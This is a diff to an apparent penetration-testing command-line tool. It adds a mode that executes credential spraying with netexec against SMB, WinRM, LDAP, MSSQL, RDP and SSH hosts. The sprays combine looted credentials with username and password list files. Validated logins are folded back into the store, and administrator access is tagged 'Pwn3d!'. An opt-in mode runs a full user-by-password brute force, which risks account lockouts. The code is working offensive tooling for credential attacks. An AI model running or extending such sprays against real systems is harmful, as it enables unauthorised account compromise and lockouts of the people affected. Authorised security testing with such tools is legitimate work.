@@ -2689,9 +2689,28 @@ def _parse_cred_spec(spec: str):
                       source="manual")
 
 
+def _spray_cred_set(args, stacked):
+    """The credential set to spray: the stacked/looted creds (default) plus any
+    --user-list usernames and --pass-list passwords. Returns Credential objects; a
+    spray combines all usernames x all passwords (paired when lockout-safe)."""
+    from .models import Credential
+    creds = list(stacked)
+    for path, make in ((getattr(args, "user_list", None), lambda v: Credential(username=v)),
+                       (getattr(args, "pass_list", None),
+                        lambda v: Credential(secret=v, kind="password"))):
+        if not path:
+            continue
+        try:
+            with open(path, encoding="utf-8", errors="replace") as fh:
+                creds.extend(make(v) for v in (ln.strip() for ln in fh) if v)
+        except OSError as e:
+            print(f"[!] could not read {path}: {e}")
+    return creds
+
+
 def cmd_creds(args: argparse.Namespace) -> int:
-    """Stack credentials (auto-harvested + manually captured) and build a spray
-    plan across the discovered SMB/WinRM/LDAP/MSSQL/RDP/SSH surface."""
+    """Stack credentials (auto-harvested + manually captured) and build/run a spray
+    across the discovered SMB/WinRM/LDAP/MSSQL/RDP/SSH surface."""
     from . import credentials as cr
     from .models import Credential
     paths = _open_paths(args.output_dir)
@@ -2740,6 +2759,40 @@ def cmd_creds(args: argparse.Namespace) -> int:
               "keeps going after a hit;")
         print("    the paired (user<->pass) list avoids a cartesian brute. Rules of "
               "engagement only.")
+        store.close()
+        return 0
+
+    # RUN: actually spray with netexec (lockout-safe by default) and fold the hits.
+    if getattr(args, "run", False):
+        spray_creds = _spray_cred_set(args, stacked)
+        if not spray_creds:
+            print("[!] No credentials/usernames to spray. Loot some (recce act --run), "
+                  "add one (--add), or pass --user-list/--pass-list.")
+            store.close()
+            return 0
+        safe = not getattr(args, "spray", False)
+        n_ips = sum(len(v) for v in cr.spray_targets(hosts).values())
+        print(f"[*] Spraying {len(spray_creds)} credential(s) across the {n_ips} "
+              f"login-surface host(s) — {'lockout-safe (paired, one pass)' if safe else 'FULL user x pass (lockout risk)'} ...")
+        res = cr.run_spray(hosts, spray_creds, args.output_dir, safe=safe)
+        if not res["ok"]:
+            print(f"[x] {res['error']}")
+            store.close()
+            return 1
+        hits = res["hits"]
+        if hits:
+            print(f"\n[+] {len(hits)} VALID login(s):")
+            for h in hits:
+                tag = "  (ADMIN / Pwn3d!)" if h["admin"] else ""
+                print(f"      {h['proto']:<6} {h['ip']:<16} {h['cred']}{tag}")
+                store.add_credential(Credential(
+                    username=h["user"], secret=h["secret"],
+                    kind="password", source="spray-validated", origin_ip=h["ip"],
+                    notes=f"validated over {h['proto']}" + (" (local admin)" if h["admin"] else "")))
+            _generate_reports(store, paths, store.get_meta("engagement") or getattr(args, "title", "") or "Recce Engagement", quiet=True)
+        else:
+            print("\n[i] No valid logins from the spray "
+                  "(creds rejected, or the surface needs a different protocol).")
         store.close()
         return 0
 
@@ -6112,6 +6165,20 @@ def build_arg_parser() -> argparse.ArgumentParser:
     cd.add_argument("--plan", action="store_true",
                     help="build the spray plan (write users/passwords/hashes files "
                          "+ print the netexec/impacket commands)")
+    cd.add_argument("--run", action="store_true",
+                    help="EXECUTE the spray with netexec (lockout-safe: paired user<->pass, "
+                         "one pass) across the target scope, and fold the validated logins "
+                         "back. Needs netexec/nxc on PATH.")
+    cd.add_argument("--user-list", metavar="FILE",
+                    help="a file of usernames to spray (one per line), in addition to the "
+                         "stacked/looted creds")
+    cd.add_argument("--pass-list", metavar="FILE",
+                    help="a file of passwords to spray (one per line)")
+    cd.add_argument("--all-creds", action="store_true",
+                    help="spray every stacked/looted credential (the default set for --run)")
+    cd.add_argument("--spray", action="store_true",
+                    help="full user x password (drops --no-bruteforce). REAL lockout risk on "
+                         "a domain lockout policy - opt-in; default is lockout-safe paired.")
     cd.set_defaults(func=cmd_creds)
 
     # Convenience: enum + vulns in one shot.
